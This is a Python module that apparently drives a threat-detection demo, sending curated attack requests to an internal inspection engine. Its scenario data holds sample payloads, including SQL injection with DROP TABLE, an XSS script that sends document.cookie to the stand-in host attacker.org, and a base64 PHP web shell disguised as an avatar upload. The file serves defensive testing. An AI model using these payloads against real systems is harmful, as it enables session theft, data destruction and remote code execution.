import asyncio
from typing import Dict, Any, Optional
from app.models.schemas import ThreatType, RequestInspectionPayload
from app.core.engine import threat_engine

# Curated test payloads for real-time demonstration
SCENARIOS: Dict[ThreatType, Dict[str, Any]] = {
    ThreatType.SQL_INJECTION: {
        "source_ip": "198.51.100.23",
        "method": "GET",
        "path": "/api/products",
        "query_params": {"category": "electronics' OR 1=1; DROP TABLE users; --"},
        "body": None,
        "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    },
    ThreatType.XSS: {
        "source_ip": "192.0.2.88",
        "method": "POST",
        "path": "/api/reviews",
        "query_params": {},
        "body": '{"product_id": 402, "rating": 5, "comment": "<script>fetch(\'http://attacker.org/steal?cookie=\' + document.cookie)</script>"}',
        "headers": {"Content-Type": "application/json"}
    },
    ThreatType.BRUTE_FORCE: {
        "source_ip": "203.0.113.45",
        "method": "POST",
        "path": "/api/auth/login",
        "query_params": {},
        "body": '{"username": "admin", "password": "WrongPassword123!"}',
        "headers": {"Content-Type": "application/json"},
        "repeat": 7
    },
    ThreatType.DDOS: {
        "source_ip": "45.33.32.156",
        "method": "GET",
        "path": "/api/products",
        "query_params": {},
        "body": None,
        "headers": {"User-Agent": "Mozilla/5.0"},
        "repeat": 35
    },
    ThreatType.MALWARE_UPLOAD: {
        "source_ip": "185.220.101.5",
        "method": "POST",
        "path": "/api/upload/avatar",
        "query_params": {},
        "file_name": "profile_avatar.png.php",
        "file_content_base64": "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXZsK", # <?php system($_GET['cmd'])
        "headers": {"Content-Type": "multipart/form-data"}
    },
    ThreatType.SESSION_HIJACKING: {
        "source_ip": "103.251.167.22",
        "method": "GET",
        "path": "/api/account/orders",
        "session_id": "sess_vip_shopper_9988",
        "headers": {"User-Agent": "Python-requests/2.31.0"}
    },
    ThreatType.API_ABUSE: {
        "source_ip": "198.51.100.23",
        "method": "POST",
        "path": "/api/checkout",
        "query_params": {},
        "body": '{"product_id": 105, "quantity": 1, "price": 0.00, "role": "admin"}',
        "headers": {"Content-Type": "application/json"}
    },
    ThreatType.BOT_ATTACK: {
        "source_ip": "203.0.113.45",
        "method": "GET",
        "path": "/api/cart/batch-add",
        "query_params": {"sku": "GPU-RTX-5090", "qty": "50"},
        "headers": {"User-Agent": "Scrapy/2.11.0 (+https://scrapy.org)"}
    },
    ThreatType.PAYMENT_FRAUD: {
        "source_ip": "192.0.2.88",
        "method": "POST",
        "path": "/api/checkout/authorize",
        "query_params": {},
        "body": '{"card_number": "4111111111111111", "amount": 0.99, "currency": "USD"}',
        "headers": {"Content-Type": "application/json"},
        "repeat": 6
    },
    ThreatType.DATA_EXFILTRATION: {
        "source_ip": "185.220.101.5",
        "method": "GET",
        "path": "/api/customers/export-all",
        "query_params": {"limit": "100000", "export": "all", "action": "dump"},
        "body": None,
        "headers": {"User-Agent": "Mozilla/5.0"}
    }
}

class AttackSimulator:
    async def simulate(
        self,
        threat_type: ThreatType,
        source_ip: Optional[str] = None,
        target: Optional[str] = None,
        payload_override: Optional[str] = None
    ) -> Dict[str, Any]:
        scenario = SCENARIOS.get(threat_type, SCENARIOS[ThreatType.SQL_INJECTION])
        
        chosen_ip = source_ip or scenario.get("source_ip", "198.51.100.23")
        chosen_path = target or scenario.get("path", "/api/products")
        chosen_body = payload_override if payload_override is not None else scenario.get("body")
        repeat_count = scenario.get("repeat", 1)

        result = None
        for i in range(repeat_count):
            req_payload = RequestInspectionPayload(
                method=scenario.get("method", "GET"),
                path=chosen_path,
                headers=scenario.get("headers", {}),
                query_params=scenario.get("query_params", {}),
                body=chosen_body,
                client_ip=chosen_ip,
                user_agent=scenario.get("headers", {}).get("User-Agent", "Mozilla/5.0"),
                session_id=scenario.get("session_id"),
                file_name=scenario.get("file_name"),
                file_content_base64=scenario.get("file_content_base64")
            )
            result = await threat_engine.inspect_request(req_payload)
            if repeat_count > 1 and i < repeat_count - 1:
                await asyncio.sleep(0.01)

        return {
            "status": "success",
            "threat_type": threat_type.value,
            "repeat_count": repeat_count,
            "target": chosen_path,
            "source_ip": chosen_ip,
            "detection_result": result.model_dump() if result else None
        }

attack_simulator = AttackSimulator()
